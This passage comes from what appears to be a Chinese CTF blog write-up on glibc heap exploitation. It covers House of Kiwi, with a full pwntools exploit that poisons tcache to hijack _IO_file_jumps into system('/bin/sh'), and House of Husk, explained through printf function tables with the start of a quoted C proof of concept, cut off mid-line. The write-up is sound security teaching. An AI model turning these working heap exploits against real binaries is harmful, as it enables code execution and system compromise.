[rbp+0x60]<br></code></pre></td></tr></table></figure><p>å¥½çš„ï¼Œæ¯”è¾ƒå…³é”®çš„å‡ ä¸ªç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x7ffff7e5a4cf &lt;fflush+15&gt;:  mov    rbx,rdi# rbx = stderr<br>#0x7ffff7e5a50e &lt;fflush+78&gt;:  mov    rdi,QWORD PTR [rbx+0x88] rdi = [stderr + 0x88] = _IO_stdfile_2_lock<br><br>0x7ffff7e5a51d &lt;fflush+93&gt;:  mov    rbp,QWORD PTR [rbx+0xd8] # rbp = [stderr + 0xd8] = _IO_file_jumps<br>0x7ffff7e5a524 &lt;fflush+100&gt;: lea    rdx,[rip+0x167375]        # 0x7ffff7fc18a0 &lt;_IO_helper_jumps&gt;<br>0x7ffff7e5a543 &lt;fflush+131&gt;: call   QWORD PTR [rbp+0x60]# call [_IO_helper_jumps + 0x60] &lt;-&gt; call __sync<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æˆ‘ä»¬çš„ <strong>rdx = _IO_helper_jumps</strong>ï¼Œè€Œé«˜ç‰ˆæœ¬çš„ setcontext åˆæ˜¯ç”± rdx æ§åˆ¶ï¼š</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526174433379.png" alt="image-20220526174433379" style="zoom:67%;" /><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨ <code>_IO_helper_jumps + 0xA0</code> å¸ƒç½®çš„ <code>rsp = rop_chain </code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">â–º <span class="hljs-number">0x7ffff7e2d0dd</span> &lt;setcontext+<span class="hljs-number">61</span>&gt;     mov    rsp, qword ptr [rdx + <span class="hljs-number">0xa0</span>]   &lt;<span class="hljs-number">0x7ffff7fc1940</span>&gt;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>_IO_helper_jumps + 0xA8</code> å¸ƒç½®çš„ rcxï¼Œä¹Ÿå°±æ˜¯è¢« push è¿›æ ˆï¼Œç»“æŸå ret å–åˆ°çš„ <code>rip = ret</code>ï¼š</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526175716709.png" alt="image-20220526175716709" style="zoom:67%;" /> <p>å†å¾€ä¸‹èµ°å°±åˆ°äº† ROP é“¾äº†ï¼Œä¸åšè¿‡å¤šè°ƒè¯•å±•ç¤ºï¼š</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526180101385.png" alt="image-20220526180101385" style="zoom:67%;" /><p>æœ€åä¹Ÿæ˜¯æˆåŠŸåœ°æ‰§è¡Œäº†æˆ‘ä»¬çš„é“¾å­ï¼Œorw å‡ºäº† flagã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[DEBUG] Received 0xdc bytes:<br>    <span class="hljs-string">&quot;ez_kiwi: malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27; failed.\n&quot;</span><br>ez_kiwi: malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)<span class="hljs-string">&#x27; failed.</span><br><span class="hljs-string">[DEBUG] Received 0x30 bytes:</span><br><span class="hljs-string">    00000000  63 61 66 66  65 31 6e 65  7b 74 65 73  74 5f 66 6c  â”‚caffâ”‚e1neâ”‚&#123;tesâ”‚t_flâ”‚</span><br><span class="hljs-string">    00000010  61 67 7e 51  77 51 7e 7e  7e 7d 0a 00  00 00 00 00  â”‚ag~Qâ”‚wQ~~â”‚~&#125;Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="hljs-string">    00000020  40 65 e6 f7  ff 7f 00 00  10 d0 55 55  55 55 00 00  â”‚@eÂ·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·UUâ”‚UUÂ·Â·â”‚</span><br><span class="hljs-string">    00000030</span><br><span class="hljs-string">caffe1ne&#123;test_flag~QwQ~~~&#125;</span><br><span class="hljs-string">\x00\x00\x00e\x7f\x00\x10UUUU\x00</span><br></code></pre></td></tr></table></figure><h6 id="æ²¡æ²™ç®±çš„ç®€å•æƒ…å½¢"><a class="header-anchor" href="#æ²¡æ²™ç®±çš„ç®€å•æƒ…å½¢">Â¶</a>æ²¡æ²™ç®±çš„ç®€å•æƒ…å½¢</h6><p>ä¸»è¦æ˜¯ææ¸…æ¥šè¿™ä¸ªåˆ©ç”¨è·¯çº¿ï¼Œæ˜ç™½å•¥æ—¶å€™ ğŸ‘ æŒ‡å®šçš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>å› ä¸ºæ¯”èµ›æ—¶é¢˜ç›®æ²¡å¼€æ²™ç®±ï¼Œè€Œä¸”æ˜¯ <strong>2.31</strong> ç‰ˆæœ¬çš„ libcï¼Œä¸‹é¢æ˜¯æŠŠ <strong>__sync</strong> ç›´æ¥æ¢æˆ <code>system</code> å‡½æ•°ï¼Œåœ¨ stderr å†™ <code>/bin/sh\0</code> çš„æ›´ç®€å•æƒ…å½¢ã€‚</p><p>è¿™é‡Œèµ° kiwi ğŸ‘ çš„æ˜¯ <strong>main_arena -&gt; top</strong> ï¼Œå°±<strong>ä¸éœ€è¦ leak å †åœ°å€</strong>äº†ã€‚å½“ç„¶ leak å †åœ°å€å¯ä»¥åå»åŠ«æŒ <strong>Tcache Struct</strong> ç„¶åçå‡ æŠŠ ğŸ‘ ä½†æ˜¯ ğŸ‘´ æœ€è¿‘å‡ å¤©ç© Tcache ç©ç´¯äº†å°±æ²¡æ‰“äº†ã€‚ä½†å¦‚æœæ˜¯ <strong>2.32</strong> ä»¥ä¸Šç‰ˆæœ¬ï¼Œç”±äº<a href="https://caffeine.darkflow.top/posts/d6d32804.html">æŒ‡é’ˆå¼‚æˆ–æœºåˆ¶</a>ï¼Œè¿˜æ˜¯å¿…é¡»è¦ leakã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,<span class="hljs-built_in">id</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;How much do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Which one do you want to put?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Tell me your idea:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to remove?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to look?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to change?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Change your idea:&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    menu(<span class="hljs-number">666</span>)<br><br><span class="hljs-comment"># flag_addr = heap_base + 0x2a0</span><br>sla(<span class="hljs-string">&#x27;Before the game starts, please give me your name:\n&#x27;</span>,<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><br><span class="hljs-comment"># Easy Heap Fengshui</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">5</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">6</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>) <span class="hljs-comment"># 8</span><br><br><span class="hljs-comment"># chunk1 -&gt; size = 0x40</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x41&#x27;</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># chunk2 -&gt; size = 0x460 Create a unsortedbin</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>*<span class="hljs-number">4</span> + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Leak libc</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ebf75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>__sync = libc.sym._IO_file_jumps + <span class="hljs-number">0x60</span><br>_IO_helper_jumps = libc_base + <span class="hljs-number">0x1ec8a0</span><br><br><span class="hljs-comment"># Tcache Poisoning1 _IO_file_jumps -&gt; __sync = system</span><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(__sync) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>,p64(libc.sym.system))<br><br><span class="hljs-comment"># Tcache Poisoning2 _IO_2_1_stderr_ -&gt; _flags = &#x27;/bin/sh\0&#x27;</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(libc.sym._IO_2_1_stderr_) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><br><span class="hljs-comment"># Tcache Poisoning3 main_arena -&gt; top = &amp;main_arena - 0x10 </span><br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(libc_base + <span class="hljs-number">0x1ebbe0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>,p64(libc_base + <span class="hljs-number">0x1ebbe0</span> - <span class="hljs-number">96</span> - <span class="hljs-number">16</span>)*<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Trigger kiwi ~~</span><br>gift()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">In file: /home/caffe1ne/Exps/Glibc/glibc<span class="hljs-number">-2.31</span>/libio/iofflush.c<br>   <span class="hljs-number">34</span>     <span class="hljs-keyword">return</span> _IO_flush_all ();<br>   <span class="hljs-number">35</span>   <span class="hljs-keyword">else</span><br>   <span class="hljs-number">36</span>     &#123;<br>   <span class="hljs-number">37</span>       <span class="hljs-type">int</span> result;<br>   <span class="hljs-number">38</span>       CHECK_FILE (fp, EOF);<br> â–º <span class="hljs-number">39</span>       _IO_acquire_lock (fp);<br>   <span class="hljs-number">40</span>       result = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>   <span class="hljs-number">41</span>       _IO_release_lock (fp);<br>   <span class="hljs-number">42</span>       <span class="hljs-keyword">return</span> result;<br>   <span class="hljs-number">43</span>     &#125;<br>   <span class="hljs-number">44</span> &#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿è¡Œ <strong>_IO_SYNC (fp)</strong> æ—¶è¿è¡Œçš„å°±æ˜¯ <code>system('/bin/sh')</code> ã€‚</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526182847525.png" alt="image-20220526182847525" style="zoom:67%;" /><hr><h3 id="House-of-Husk"><a class="header-anchor" href="#House-of-Husk">Â¶</a>House of Husk</h3><p>è¿™æ¡åˆ©ç”¨è·¯çº¿æ¯”è¾ƒç®€å•ï¼Œæ¡ä»¶æ˜¯ä¿©æ¬¡ä»»æ„å†™æˆ–è€…ä¿©æ¬¡ Largebin Attackã€‚</p><h4 id="åŸç†-v2"><a class="header-anchor" href="#åŸç†-v2">Â¶</a>åŸç†</h4><p><strong>printf_positional</strong> çš„ <strong>printf-parsemb</strong> å‡½æ•°ä¸­å¯¹å¤„ç†å„ç§æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ‡è¯†ç¬¦( <code>%p</code>,<code>%X</code> ç­‰)ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Get the format specification.  */</span><br>spec-&gt;info.spec = (<span class="hljs-type">wchar_t</span>) *format++;<br>spec-&gt;size = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (__builtin_expect (__printf_function_table == <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>)<br>    || spec-&gt;info.spec &gt; UCHAR_MAX<br>    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="hljs-literal">NULL</span><br>    <span class="hljs-comment">/* We don&#x27;t try to get the types for all arguments if the format</span><br><span class="hljs-comment">uses more than one.  The normal case is covered though.  If</span><br><span class="hljs-comment">the call returns -1 we continue with the normal specifiers.  */</span><br>    || (<span class="hljs-type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])<br>   (&amp;spec-&gt;info, <span class="hljs-number">1</span>, &amp;spec-&gt;data_arg_type,<br>    &amp;spec-&gt;size)) &lt; <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>å½“ <code>__printf_function_table != NULL</code> å¹¶ä¸” <code>__printf_arginfo_table[sepc] != NULL</code> æ—¶ï¼Œä¼šè°ƒç”¨ <code>__printf_function_table[(size_t) spec]</code> å¤„çš„å‡½æ•°ã€‚</p><p>æŒ‡å®šæ ‡è¯†ç¬¦åç§»è®¡ç®—ï¼Œä»¥ â€˜Xâ€™ ä¸ºä¾‹ï¼š<br>$$<br>(ord(char) -2)*8\<br>(ord(â€˜Xâ€™)-2)<em>8=86</em>8=688=0x2b0<br>$$<br>ç›¸åº”çš„æˆ‘ä»¬å¾—åˆ°æœ€å¸¸ç”¨åˆ°çš„ <code>%s</code> åç§»ä¸º <strong>0x388</strong> ã€‚</p><p>æ³¨æ„è¿™é‡Œ <strong>-2</strong> æ˜¯å› ä¸ºä»å†…å­˜åŒºåŸŸ<strong>è€Œä¸æ˜¯chunkå¤´</strong>è®¡ç®—ï¼Œä» chunk å¤´éƒ¨è®¡ç®—å°±ä¸è¦å‡äºŒäº†ã€‚ä¾‹å¦‚ <code>%s</code> ä¸º $ord(â€˜sâ€™)*8=0x398$ ï¼ŒğŸ‘´ å°±æ˜¯è¢«è¿™ç©æ„å‘äº†ï¼Œä¸å¸Œæœ›å¤§ ğŸ”¥ ä¹Ÿä¸Šå½“å—éª—ã€‚</p><h4 id="ä½¿ç”¨åœºæ™¯-v2"><a class="header-anchor" href="#ä½¿ç”¨åœºæ™¯-v2">Â¶</a>ä½¿ç”¨åœºæ™¯</h4><p>èƒ½æ§åˆ¶ <strong>__printf_arginfo_table,__printf_function_table</strong> ä¸ºå †åœ°å€ï¼Œä»¥åœ¨åˆ¶å®šåç§»å¤„å†™æˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°ï¼Œè¿™ä¿©å¼ è¡¨éƒ½èƒ½å†™å‡½æ•°ï¼Œè°ƒç”¨ä½ç½®ä¸åŒã€‚</p><p><strong>one_gadget</strong> èµ·æ•ˆæ—¶ï¼Œ<strong>husk</strong> æœ‰å¥‡æ•ˆï¼Œéå¸¸å¥½ç”¨ã€‚ä¸èµ·æ•ˆæˆ–å¼€äº†æ²™ç®±æ—¶ï¼Œå¯ä»¥åœ¨å‡½æ•°è¡¨å†™ <strong>exit</strong> è¿›å…¥ exit æµç¨‹ï¼Œé…åˆå…¶ä»–é«˜ç‰ˆæœ¬ house ä½¿ç”¨ã€‚</p><h4 id="Demo-v3"><a class="header-anchor" href="#Demo-v3">Â¶</a>Demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ptr-yudai/House-of-Husk/blob/master/poc-husk.c</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Husk&#x27;s method - House of Husk</span><br><span class="hljs-comment"> * This PoC is supposed to be run with libc-2.27</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA       0x3ebc40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA_DELTA 0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_FUNCTABLE 0x3f0658</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_ARGINFO   0x3ec870</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ONE_GADGET       0x10a38c</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> libc_base;<br>  <span class="hljs-type">char</span> *a[<span class="hljs-number">10</span>];<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// make printf quiet</span><br><br>  <span class="hljs-comment">/* leak libc */</span><br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* UAF chunk */</span><br>  a[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));<br>  a[<span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));<br>  a[<span 